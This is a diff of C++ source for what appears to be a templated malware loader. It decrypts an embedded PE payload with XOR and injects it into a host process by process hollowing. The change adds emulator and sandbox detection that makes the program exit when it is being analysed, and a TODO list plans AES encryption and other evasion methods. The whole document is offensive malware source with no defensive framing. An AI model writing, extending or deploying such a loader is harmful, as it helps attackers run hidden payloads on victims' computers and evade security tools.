@@ -1,18 +1,17 @@
-#include "resource.h"
+#include "antivirusChecks.h"
+#include "decrypt.h"
 #include "processHollower.h"
+#include "resource.h"
 
 #define {{ cookiecutter.target_exe_type}}
 
-VOID DecryptPE(char *lpGuestPEData, DWORD dwResourceSize) {
-    char key[] = "{{ cookiecutter.encryption_key }}";
-    int keyLength = {{ cookiecutter.key_length }};
-
-    for (int i = 0; i < dwResourceSize; i++) {
-        lpGuestPEData[i] ^= key[i % keyLength];
-    }
-}
-
 int main() {
+    if (isCodeEmulated() || isSandBox()) {
+#ifndef NDEBUG
+        system("pause");
+#endif
+        return 0;
+    }
     HRSRC hResource = FindResource(nullptr, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
     DWORD dwResourceSize = SizeofResource(nullptr, hResource);
     HGLOBAL hResourceData = LoadResource(nullptr, hResource);
@@ -20,7 +19,7 @@ int main() {
     char* lpGuestPEData = new char[dwResourceSize];
     CopyMemory(lpGuestPEData, pResourceData, dwResourceSize);
 
-    DecryptPE(lpGuestPEData, dwResourceSize);
+    Xor(lpGuestPEData, dwResourceSize, RESOURCE_KEY, RESOURCE_KEY_LENGTH);
 
     ProcessHollower PHollower;
 
@@ -33,9 +32,9 @@ int main() {
 
     if (!PHollower.execute(lpHostApplicationName, lpGuestPEData))
         return -1;
-    #ifndef NDEBUG
+#ifndef NDEBUG
     system("pause");
-    #endif
+#endif
     return 0;
 }
 
@@ -47,7 +46,7 @@ int main() {
  * + 64 bits
  * + Debug messages
  * - Try allocation at injected PE BaseAddress (modify PEB), if it fails try as now
- * - Force GUI if target is GUI. Also check before compilation check if is GUI (otherwise, when bulid type is release do not compile as GUI)
+ * - Force GUI if target is GUI
  * - AES decryption
  * - Other methods: avoid SetThreadContext, etc.
  */
